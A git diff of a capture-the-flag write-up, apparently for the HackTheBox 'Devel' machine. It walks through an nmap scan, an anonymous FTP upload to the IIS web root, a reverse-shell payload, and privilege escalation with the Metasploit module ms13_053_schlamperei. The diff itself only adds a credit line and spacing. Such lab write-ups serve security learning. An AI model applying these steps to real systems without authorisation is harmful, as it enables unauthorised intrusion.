@@ -1,5 +1,7 @@
 # Devel
 #### 10.10.10.5
+###### Solved by: Dotaplayer365 and revdev
+
 
 ```{r, engine='bash', count_lines}
 nmap -sS -sV 10.10.10.5
@@ -18,6 +20,7 @@ Nmap done: 1 IP address (1 host up) scanned in 34.56 seconds
 
 
 The website has a default IIS page.
+
 Something seems fishy!
 
 
@@ -38,8 +41,11 @@ Password:
 Remote system type is Windows_NT.
 ftp> 
 ```
+
 Anonymous login is allowed. 
+
 Time to see whats inside
+
 ```{r, engine='bash', count_lines}
 ftp> ls
 200 PORT command successful.
@@ -50,6 +56,7 @@ ftp> ls
 226 Transfer complete.
 ```
 Why does this have a welcome.png, is this the webservers root ?
+
 Lets put something in the folder and check if we can browse it
 
 We first create a testfile
@@ -77,6 +84,7 @@ Voila! the file appears.
 **Time for some shellz**
 
 Was thinking of doing something with Insomnia shell but heck, metasploit is much easier
+
 Create a reverse shell payload with msfvenom and upload it via the ftp
 
 ```{r, engine='bash', count_lines}
@@ -175,6 +183,7 @@ meterpreter >
 ```
 
 We try and browse to the user directory for our flag and we get **Access Denied**
+
 Looks like we need to escalate privs for the user.txt as well :(
 
 
@@ -267,8 +276,11 @@ Network Card(s):           1 NIC(s) Installed.
 Lets get ready to rumble!!!
 
 Select our exploit and set its options
+
 **_NOTE_**: we need to change the port from 4444 to 4443
+
 This is because our primary exploit(the dotaplayer.aspx reverse shell) is connected on port 4444
+
 ```{r, engine='bash', count_lines}
 msf post(local_exploit_suggester) > use exploit/windows/local/ms13_053_schlamperei
 msf exploit(ms13_053_schlamperei) > set SESSION 1
